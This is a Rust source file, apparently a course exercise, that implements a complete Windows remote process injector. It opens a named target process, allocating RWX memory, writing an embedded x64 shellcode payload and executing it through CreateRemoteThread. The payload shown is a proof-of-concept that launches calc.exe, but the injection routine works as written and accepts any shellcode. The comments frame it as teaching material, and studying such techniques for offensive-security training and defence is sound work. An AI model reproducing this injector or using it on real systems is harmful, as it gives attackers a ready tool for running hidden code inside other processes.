// Base code taken from Exercise 2, refer there if anything is unclear
// There are some interesting examples of ownership in Rust here, pay attention to the &'s and "to_owned()" :)

// New imports are 'std::env' and 'std::io'
// We use these for command line and interactive argument parsing, respectively
use std::env;
use std::io;

// We also import 'std::process' so we can spawn the target process if it does not exist
use std::process::Command;

use std::ptr;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::{
    Foundation::*,
    System::{Diagnostics::Debug::*, Memory::*, Threading::*},
};

fn inject_remote(shellcode: &[u8], process_id: u32) {
    unsafe {
        let p_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
        println!("[+] Got target process handle: {:?}", p_handle);

        let r_ptr = VirtualAllocEx(
            p_handle,
            ptr::null(),
            shellcode.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        println!(
            "[+] Allocated RWX memory in remote process at address {:?}",
            r_ptr
        );

        let mut bytes_written = 0;
        WriteProcessMemory(
            p_handle,
            r_ptr,
            shellcode.as_ptr() as _,
            shellcode.len(),
            &mut bytes_written,
        );
        println!("[+] Wrote {} bytes to remote process memory", bytes_written);

        let t_handle = CreateRemoteThread(
            p_handle,
            ptr::null(),
            0,
            Some(std::mem::transmute(r_ptr)),
            ptr::null(),
            0,
            ptr::null_mut(),
        );
        println!("[+] Created remote thread!");

        CloseHandle(t_handle);
        CloseHandle(p_handle);
    }
}

fn main() {
    let shellcode: [u8; 296] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x43, 0x3a, 0x5c,
        0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
        0x32, 0x5c, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    // Get the process name from user input
    // We try to get it from the first command line argument (e.g. '.\injector.exe notepad.exe')
    // If no argument is provided, we will prompt it interactively
    let args: Vec<String> = env::args().collect();
    let mut target_process: String = String::new();

    if args.len() > 1 {
        target_process = args[1].clone();
    } else {
        println!("Enter the target process name: ");
        io::stdin()
            .read_line(&mut target_process)
            .expect("Failed to read line");
        target_process = target_process.trim().to_owned(); // Strip trailing newline
    }

    // If the target process specification ends with '.exe', we strip that
    if target_process.ends_with(".exe") {
        target_process = target_process.replace(".exe", "");
    }

    // Since we are using the 'sysinfo' crate, dynamic parsing of the target process by name is easy
    // We can simply plug the user input name into othe processes_by_name() function
    let s = System::new_all();
    let process_id: u32; // Does not have to be mutable, since we assign only once
    let process_ids: Vec<_> = s.processes_by_name(&target_process).collect();

    // Now, instead of grabbing the PID directly, we can check if the process exists
    // If it does not exist, we have to spawn it
    if !process_ids.is_empty() {
        process_id = process_ids[0].pid().as_u32();
    } else {
        println!(
            "[~] Could not find target '{}' process, will spawn it...",
            &target_process
        );

        process_id = Command::new(&target_process)
            .spawn()
            .expect("Failed to spawn process")
            .id();
    }

    println!(
        "[+] Found target '{}' process with PID {}",
        target_process, process_id
    );

    inject_remote(&shellcode, process_id);
}
